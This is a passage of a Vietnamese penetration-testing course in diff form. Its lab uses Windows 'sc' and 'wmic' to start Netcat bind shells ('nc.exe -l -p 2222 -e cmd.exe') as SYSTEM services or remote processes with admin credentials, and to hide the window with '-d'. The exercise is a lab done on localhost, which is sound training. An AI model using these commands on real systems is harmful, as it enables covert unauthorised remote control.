@@ -4826,3 +4826,266 @@ Các lựa chọn là:
 Trong bài thực hành này, bạn đã tìm hiểu cách thực hiện một cuộc tấn công cấp độ mạng bằng Responder để thu được các hàm băm NTLMv2 và cách chúng ta có thể sử dụng John The Ripper để bẻ khóa các hàm băm này. Kỹ thuật này rất hữu ích cho các chuyên gia kiểm thử xâm nhập để phân biệt mật khẩu và sử dụng chúng để có được quyền truy cập sâu hơn vào môi trường mục tiêu.
 
 Chúng ta cũng đã thấy được tính linh hoạt của việc nghe lén gói tin. Chúng ta đã sử dụng tcpdump để thu thập thông tin xác thực, trích xuất mã băm và giải mã phản hồi/thử thách NTLMv2, cũng như giải mã các mã băm đó.
+
+# Lab 4.1. Chạy các lệnh với SC và WMIC
+
+## Mục tiêu
+
+- Sử dụng lệnh `sc` để tạo một dịch vụ từ trình lắng nghe cửa hậu Netcat.
+
+- Để điều khiển dịch vụ nghe lén cửa sau bằng lệnh `sc`.
+
+- Để thiết lập khả năng giám sát cổng bằng lệnh `netstat` Windows, hãy sử dụng lệnh sau:
+
+- Dùng `wmic` để tạo trình lắng nghe cửa hậu Netcat
+
+- Để phân tích cách `wmic` giám sát các tiến trình bằng cú pháp `/every:1` của nó.
+
+## Thiết lập phòng thí nghiệm
+
+Các máy ảo được sử dụng:
+
+- Windows 10.
+
+## Hướng dẫn thực hành từng bước
+
+Hãy cùng thực hiện một bài thực hành với một số phương pháp chúng ta đã học để chạy một lệnh trên máy tính Windows mục tiêu. Cụ thể, chúng ta sẽ sử dụng các kỹ thuật `sc` và `wmic`. Trong bài thực hành này, chúng ta sẽ làm cho Windows chạy một lệnh gọi trình lắng nghe Netcat, cung cấp quyền truy cập shell lệnh tương tác từ xa vào máy nạn nhân. Lệnh mà chúng ta sẽ chạy trên máy tính Windows của mình với quyền SYSTEM cục bộ là:
+
+```bash
+nc.exe -l -p 2222 -e cmd.exe
+```
+
+Lệnh này yêu cầu Netcat (`nc.exe`) chạy như một trình lắng nghe (`-l`) trên cổng cục bộ (`-p`) 2222, và khi có ai đó kết nối, nó sẽ thực thi (`-e`) một `cmd.exeshell`. Kẻ tấn công sau đó có thể kết nối với máy trên cổng TCP 2222 và có quyền truy cập shell lệnh tương tác từ xa. Trong bài thực hành này, chúng ta sẽ sử dụng các kỹ thuật này cục bộ để thực hành. Nhưng hãy nhớ rằng mỗi kỹ thuật đều có thể được sử dụng từ xa.
+
+Hãy cùng nhìn lại và xem xét mục tiêu chúng ta đang muốn tìm hiểu ở đây. Ý tưởng là, nếu người kiểm thử có ID người dùng quản trị và mật khẩu, cũng như quyền truy cập mạng SMB vào máy mục tiêu, họ có thể sử dụng lệnh `sc` hoặc `wmic` trên máy của kẻ tấn công để buộc máy mục tiêu chạy bất kỳ lệnh nào mà kẻ tấn công lựa chọn. Chúng ta sẽ sử dụng lệnh `sc` và `wmic` để buộc máy mục tiêu thực thi một shell lệnh mà sau đó chúng ta có thể truy cập qua mạng để chạy nhiều lệnh riêng lẻ một cách trực tiếp và tương tác.
+
+![alt text](IMG/LAB4/LAB4.1/image.png)
+
+### 1: Thiết lập
+
+Trong thư mục `C:\Tools`, có một tệp tin `ncexer.bat` sẽ tạo ra hai cửa sổ terminal với màu sắc khác nhau cho bài thực hành này. Nếu bạn bị khiếm khuyết về thị giác màu, hãy sử dụng tiêu đề của các cửa sổ làm hướng dẫn.
+
+VUI LÒNG CHẠY TỆP TIN `ncexer.bat` VỚI QUYỀN QUẢN TRỊ. Trên Windows, bạn có thể thực hiện bằng cách nhấp chuột phải vào tệp tin và chọn "Chạy với quyền quản trị".
+
+![alt text](IMG/LAB4/LAB4.1/image-1.png)
+
+Tệp này sẽ mở ra hai cửa sổ `cmd.exe` với màu sắc và tiêu đề khác nhau. Màn hình màu vàng sẽ là Kẻ tấn công. Màn hình màu xám sẽ là Nạn nhân. Bây giờ hãy thực hành kích hoạt một backdoor Netcat đang lắng nghe trên cổng TCP 2222 và cấp quyền truy cập shell lệnh. Trên màn hình Nạn nhân (màu xám), hãy chạy lệnh sau:
+
+```bash
+# > Lệnh của nạn nhân (màu xám)
+C:\Tools\nc.exe -nvlp 2222 -e cmd.exe
+```
+
+Bây giờ, trong cửa sổ Kẻ tấn công (màu vàng), hãy sử dụng ứng dụng Netcat để kết nối với cửa hậu đó:
+
+```bash
+# > Lệnh tấn công (màu vàng)
+C:\Tools\nc.exe -nv 127.0.0.1 2222
+```
+
+![alt text](IMG/LAB4/LAB4.1/image-2.png)
+
+Bạn cần có quyền truy cập vào giao diện dòng lệnh. Hãy nhập một số lệnh, chẳng hạn như `hostname` và `dir`.
+
+Kết nối này thể hiện khái niệm về những gì chúng ta đang cố gắng đạt được: truy cập shell cửa sau vào máy tính Windows mục tiêu. Nhưng bạn cần thoát khỏi shell này để tiếp tục bài thực hành. Vui lòng ngắt cả hai đầu kết nối bằng cách nhấn `CTRL-C` vào màn hình màu vàng hoặc màu xám. Điều đó sẽ đóng cửa sau để chúng ta có thể tiếp tục và tạo lại nó bằng `sc` lệnh và `wmic` lệnh khác.
+
+![alt text](IMG/LAB4/LAB4.1/image-3.png)
+
+### 2: Tạo một dịch vụ
+
+Sau khi dừng trình lắng nghe Netcat trên cổng TCP 2222 bằng tổ hợp phím `CTRL+C`, chúng ta hãy sử dụng `sc` lệnh để biến Netcat thành một dịch vụ. Trong cửa sổ Attacker, hãy xác định tên máy chủ của bạn bằng cách chạy lệnh:
+
+```bash
+# Lệnh tấn công (màu vàng)
+hostname
+```
+
+![alt text](IMG/LAB4/LAB4.1/image-4.png)
+
+Bây giờ hãy sử dụng `sc` lệnh để tạo một dịch vụ Netcat, mà chúng ta sẽ đặt tên là `ncservice`:
+
+```bash
+# Lệnh tấn công (màu vàng)
+sc \\Sec560Student create ncservice binpath= "c:\tools\nc.exe -l -p 2222 -e cmd.exe"
+```
+
+> LƯU Ý RẰNG PHẢI CÓ KHOẢNG TRỐNG GIỮA DẤU BẰNG VÀ DẤU NGOẶC KÉP. NGOÀI RA, KHÔNG ĐƯỢC CÓ KHOẢNG TRỐNG GIỮA BINPATH VÀ DẤU BẰNG.
+
+![alt text](IMG/LAB4/LAB4.1/image-5.png)
+
+Hơn nữa, đừng sử dụng địa chỉ IP ở đây thay cho tên máy chủ (Sec560Student) vì một số máy tính Windows gặp sự cố với localhost, 127.0.0.1 hoặc địa chỉ IP cục bộ khi sử dụng làm tên cho lệnh này. Thay vào đó, chỉ cần sử dụng tên máy chủ của bạn.
+
+> Chúng tôi sử dụng tên máy chủ ở đây để mô phỏng việc chạy các lệnh trên một máy tính từ xa. Chúng ta có thể làm điều này với một trong các máy tính trong phòng thí nghiệm, nhưng sẽ có rất nhiều xung đột về cổng và tên dịch vụ. Cách này giúp bạn dễ dàng hơn và đạt được kết quả hoàn toàn giống nhau.
+
+Từ xa, lệnh này hoạt động tốt chỉ với địa chỉ IP của máy nạn nhân. Nếu dịch vụ được tạo thành công, máy của bạn sẽ hiển thị trạng thái `Create Service SUCCESS`.
+
+Sau đó, bạn có thể truy vấn trạng thái dịch vụ bằng lệnh này:
+
+```bash
+sc \\Sec560Student query ncservice
+```
+
+![alt text](IMG/LAB4/LAB4.1/image-6.png)
+
+Tiếp theo, chúng ta sẽ khởi động nó và thử kết nối với nó.
+
+Giờ chúng ta đã tạo xong `ncservice`, hãy thiết lập một trình giám sát nhỏ cho dịch vụ trong cửa sổ Nạn nhân. Bạn có thể làm điều này bằng cách giám sát cổng TCP 2222 để xem nó có bắt đầu lắng nghe hay không. Chạy lệnh `netstat` như sau:
+
+```bash
+# > Lệnh của nạn nhân (màu xám)
+netstat -nao 1 | find ":2222"
+```
+
+Lệnh này yêu cầu netstatliệt kê, dưới dạng số (`-n`), tất cả các cổng TCP và UDP (`-a`) đang được sử dụng và số ID tiến trình sử dụng mỗi cổng (`-o`), chạy mỗi giây (`1`). Lưu ý: phải có một khoảng trắng giữa (`-nao` và `1`). Sau đó, chúng ta sẽ quét đầu ra của `netstat` để tìm chuỗi "2222", điều này cho biết cổng đang được sử dụng. Cổng không nên được sử dụng khi chúng ta chạy lệnh `netstat` này vì chúng ta đã tắt trình lắng nghe Netcat thử nghiệm trước đó. `netstat` Lệnh sẽ trông như bị treo, nhưng thực ra nó đang chờ để hiển thị cho bạn một cái gì đó! Nó giống như một chiếc đồng hồ trong Linux.
+
+Nếu cổng hiện đang được sử dụng, hãy tắt tiến trình liên quan bằng Trình quản lý tác vụ hoặc lệnh `taskkilll` như sau:
+
+```bash
+# Lệnh của nạn nhân (màu xám)
+taskkill /PID [process_ID]
+```
+
+Giờ đây, sau khi đã thiết lập màn hình giám sát ở chế độ Nạn nhân, chúng ta hãy sử dụng màn hình tấn công để khởi động dịch vụ:
+
+```bash
+# Lệnh tấn công (màu vàng)
+sc \\Sec560Student start ncservice
+```
+
+![alt text](IMG/LAB4/LAB4.1/image-7.png)
+
+Trong cửa sổ Nạn nhân (màu xám), lệnh netstat của bạn sẽ bắt đầu hiển thị kết quả, cho biết cổng TCP 2222 đang LẮNG NGHE. Tuy nhiên, sau khoảng 30 giây, lệnh `sc` kết thúc và hiển thị thông báo lỗi "Dịch vụ không phản hồi yêu cầu khởi động hoặc điều khiển kịp thời". Nhưng thực tế là chúng ta đã có một máy chủ lắng nghe trong 30 giây.
+
+Bạn có thể thấy rằng cổng của bạn dường như vẫn đang mở và lắng nghe ngay cả sau khi Windows tắt dịch vụ. Đó là một trình lắng nghe cổng ảo. ID tiến trình được chỉ ra bởi đầu ra của netstat có thể không còn chạy trên Windows nữa, vì vậy không ai có thể kết nối với cổng đó, mặc dù đầu ra của netstat vẫn hiển thị `LISTENING`. Sau vài giây, Windows nhận ra điều này và giải phóng cổng.
+
+Dừng `netstat` lệnh bằng cách nhấn `CTRL-C` vào cửa sổ Nạn nhân (màu xám).
+
+Sau đó xóa tệp gốc `ncservice` để chúng ta có thể thay thế nó bằng một tệp khác hoạt động bền bỉ hơn, lắng nghe lâu hơn thời gian chờ 30 giây:
+
+```bash
+# Lệnh tấn công (màu vàng)
+sc \\Sec560Student delete ncservice
+```
+
+![alt text](IMG/LAB4/LAB4.1/image-8.png)
+
+### 3: Dịch vụ tốt hơn
+
+Khởi động lại lệnh của bạn `netstat` trong cửa sổ Nạn nhân để theo dõi trình lắng nghe của chúng tôi:
+
+```bash
+# Lệnh của nạn nhân (màu xám)
+netstat -nao 1 | find ":2222"
+```
+
+Tạo một dịch vụ Netcat tốt hơn, được gọi là ncservice2, dịch vụ này tạo ra một trình lắng nghe Netcat tồn tại trong hơn 30 giây bằng cách gọi `cmd.exe` một dịch vụ khác, dịch vụ này lại chạy Netcat bằng cách sử dụng /ktùy chọn:
+
+```bash
+# Lệnh tấn công (màu vàng)
+sc \\Sec560Student create ncservice2 binpath= "cmd.exe /k c:\tools\nc.exe -l -p 2222 -e cmd.exe"
+```
+
+Cuối cùng, hãy khởi động dịch vụ đó:
+
+```bash
+# Lệnh tấn công (màu vàng)
+sc \\Sec560Student start ncservice2
+```
+
+![alt text](IMG/LAB4/LAB4.1/image-10.png)
+
+Bây giờ, trong cửa sổ Kẻ tấn công (màu vàng), hãy kết nối với trình lắng nghe bằng ứng dụng khách Netcat:
+
+```bash
+# Lệnh tấn công (màu vàng)
+c:\tools\nc.exe 127.0.0.1 2222
+```
+
+![alt text](IMG/LAB4/LAB4.1/image-11.png)
+
+Lưu ý rằng nếu bạn nhấn phím `CTRL-C` trong ứng dụng Netcat, kết nối sẽ bị ngắt, đồng thời trình lắng nghe Netcat cũng dừng lại. Điều này là do chúng ta đã gọi trình lắng nghe Netcat với tùy chọn `-l`, tùy chọn này tạo ra một trình lắng nghe chỉ lắng nghe một kết nối và sau đó dừng hoạt động khi kết nối đó bị ngắt. Nếu chúng ta gọi nó với tùy chọn `-L`, phiên bản Netcat dành cho Windows sẽ lắng nghe lâu hơn, tạo ra một trình lắng nghe liên tục cho phép nhiều kết nối nối tiếp nhau. Với tùy chọn `-L`, Netcat tiếp tục lắng nghe giữa các kết nối. Trong kiểm thử xâm nhập, đôi khi chúng ta muốn một trình lắng nghe chỉ chạy cho một kết nối (`-l`), và đôi khi chúng ta muốn một trình lắng nghe liên tục (`-L`). Phiên bản Netcat dành cho Windows cung cấp cho chúng ta tùy chọn để chọn một trong hai.
+
+Để hoàn thành phần này của bài thực hành, hãy đảm bảo bạn đã tắt chương trình Netcat bằng cách nhấn `CTRL-C` vào cửa sổ Kẻ tấn công (màu vàng). Đồng thời, dừng `netstat` lệnh của bạn bằng cách nhấn `CTRL-C` vào cửa sổ Nạn nhân (màu xám).
+
+Và nhớ xóa tệp của bạn `ncservice2` bằng lệnh này:
+
+```bash
+# Lệnh tấn công (màu vàng)
+sc \\Sec560Student delete ncservice2
+```
+
+Hãy kiểm tra xem cổng 2222 có còn được sử dụng hay không bằng cách chạy lệnh sau:
+
+```bash
+# Lệnh của nạn nhân (màu xám)
+netstat -nao | find ":2222"
+```
+
+Lưu ý rằng chúng ta không sử dụng lệnh `1` này để chạy `netstat` mỗi giây. Chúng ta chỉ muốn nó chạy một lần để xác minh rằng cổng không còn được sử dụng nữa.
+
+![alt text](IMG/LAB4/LAB4.1/image-12.png)
+
+### 4: WMIC
+
+Tiếp theo, chúng ta sẽ khởi chạy một trình lắng nghe Netcat bằng cách sử dụng `wmic` thay vì `sc`. Như bạn sẽ thấy, việc này dễ thực hiện hơn với `wmic` và có dung lượng nhỏ hơn trên máy đích. (Tức là, chúng ta không cần phải định nghĩa một dịch vụ mà sau này sẽ xóa đi.) Tuy nhiên, tiến trình mà chúng ta gọi sẽ không có quyền SYSTEM cục bộ. Thay vào đó, tiến trình sẽ chạy với quyền quản trị viên.
+
+Hãy bắt đầu bằng cách chạy một trình giám sát trong cửa sổ Nạn nhân (màu xám). Chúng ta có thể sử dụng trình giám sát tìm kiếm một cổng cụ thể bằng lệnh port `netstat`, như trước đây. Nhưng thay vào đó, để khác biệt và mở rộng kỹ năng, hãy sử dụng một `wmic` lệnh để giám sát sự khởi đầu của một tiến trình có tên là `nc.exe`. Chúng ta có thể thực hiện điều này bằng lệnh sau:
+
+```bash
+# Lệnh của nạn nhân (màu xám)
+wmic process where name="nc.exe" list brief /every:1
+```
+
+Lệnh này được gọi `wmic` để xem xét các tiến trình có tên là `nc.exe`, liệt kê một dòng đầu ra (ngắn gọn) với thông tin quan trọng cho mỗi tiến trình có tên đó. Với /every:1cú pháp này, chúng ta có thể sử dụng `wmic` để chạy bất kỳ lệnh nào đọc thông tin từ máy của chúng ta mỗi giây. Vì không có tiến trình nào được gọi `nc.exe` trên máy của chúng ta, hệ thống sẽ thông báo: `No instance(s) Available`.Nếu bạn thấy một tệp thực thi Netcat, hãy kết thúc nó bằng `taskkill` lệnh .
+
+![alt text](IMG/LAB4/LAB4.1/image-13.png)
+
+Mặc dù wmiclệnh vẫn tiếp tục chạy mỗi giây, hãy chuyển sang cửa sổ Kẻ tấn công (màu vàng). Chúng ta hãy sử dụng lệnh này wmicđể khởi tạo trình lắng nghe Netcat trên máy mục tiêu, như sau:
+
+```bash
+# Lệnh tấn công (màu vàng)
+wmic /node:Sec560Student process call create "c:\tools\nc.exe -l -p 4444 -e cmd.exe"
+```
+
+![alt text](IMG/LAB4/LAB4.1/image-14.png)
+
+Theo mặc định, `wmic` lệnh này thực hiện trên máy cục bộ. Để lệnh này hoạt động từ xa, chúng ta cần thêm cú pháp `/node:Sec560Student /user:[AdminUser] /password: [password]` sau `wmic` và trước `process` lệnh này. Hiện tại, chỉ cần chạy lệnh này trên máy cục bộ là được.
+
+Sau đó hãy nhìn vào cửa sổ hiển thị thông tin của nạn nhân. Bạn có thấy tiến trình Netcat đang chạy trong kết quả của `wmic /every:1` lệnh không?
+
+![alt text](IMG/LAB4/LAB4.1/image-15.png)
+
+Trong cửa sổ tấn công của bạn, hãy kết nối với trình lắng nghe Netcat bằng lệnh sau:
+
+```bash
+# Lệnh tấn công (màu vàng)
+c:\tools\nc.exe 127.0.0.1 4444
+```
+
+Nhập một số lệnh, chẳng hạn như `hostname`, `whoami`, `ipconfig`, và `dir`. Bạn sẽ thấy quyền hạn của mình là người dùng quản trị đã chạy lệnh `wmic`. Khi hoàn tất, nhấn `CTRL-C` cả hai phím trong cửa sổ Kẻ tấn công (màu vàng) và Nạn nhân (màu xám) để dừng máy khách Netcat (điều này cũng sẽ tắt `-l` trình lắng nghe Netcat) và `wmic` vòng lặp giám sát.
+
+![alt text](IMG/LAB4/LAB4.1/image-16.png)
+
+Bạn có để ý thấy cửa sổ dòng lệnh hiện lên khi bạn gọi Netcat bằng lệnh nào không wmic? Có thể nó hiển thị màn hình trống với tiêu đề là `c:\tools\nc.exe`.
+
+![alt text](IMG/LAB4/LAB4.1/image-17.png)
+
+Cửa sổ dòng lệnh này là tác dụng phụ của cách chúng ta gọi Netcat. Nếu Netcat được gọi theo cách có thể tương tác với phiên làm việc trên máy tính để bàn của người dùng, nó sẽ hiển thị một cửa sổ dòng lệnh, trừ khi chúng ta gọi Netcat với `-d` tùy chọn `--disabled`. `-d` Tùy chọn này cho Netcat biết rằng nó sẽ chạy độc lập với phiên làm việc hiện tại của người dùng. Là một chuyên gia kiểm thử xâm nhập, chúng ta thường muốn tránh các cửa sổ dòng lệnh xuất hiện trên màn hình của các máy mục tiêu khi chúng ta đang kiểm thử chúng, vì vậy cách an toàn nhất thường là gọi Netcat với tùy chọn `--disabled` `-d` trên Windows. Các phiên bản Netcat dành cho Linux và UNIX không có tác dụng phụ này. Trên thực tế, không có `-d` tùy chọn `--disabled` nào trong Netcat dành cho Linux/UNIX.
+
+Hãy thử gọi `Netcat wmic` như trước, nhưng lần này với `-d` tùy chọn:
+
+```bash
+# Lệnh tấn công (màu vàng)
+wmic /node:Sec560Student process call create "c:\tools\nc.exe -dlp 4444 -e cmd.exe"
+```
+
+Giờ bạn sẽ không còn thấy cửa sổ dòng lệnh nữa. (Thực tế, nó có thể nhấp nháy nhanh trên màn hình rồi biến mất, tùy thuộc vào hiệu năng hệ thống của bạn.)
+
+```bash
+wmic /node:Sec560Student process where name="nc.exe" delete
+```
+
+## Phần kết luận
+
+Tóm lại, trong bài thực hành này, bạn đã thấy cách khiến các máy tính Windows mục tiêu chạy các lệnh do bạn lựa chọn. Hai kỹ thuật được đề cập, sử dụng scđể tạo và chạy một dịch vụ (qua đó mô phỏng psexecnhưng chỉ sử dụng các công cụ tích hợp sẵn) và chạy wmicđể khiến mục tiêu khởi động một tiến trình, đặc biệt hữu ích cho các chuyên gia kiểm thử xâm nhập vì chúng ứng dụng các tính năng tích hợp sẵn của Windows. Cuối bài thực hành này, hãy đảm bảo bạn tắt các trình lắng nghe Netcat, cũng như xóa các tệp ncservicevà ncservice2mà bạn đã tạo trong suốt bài thực hành.
+
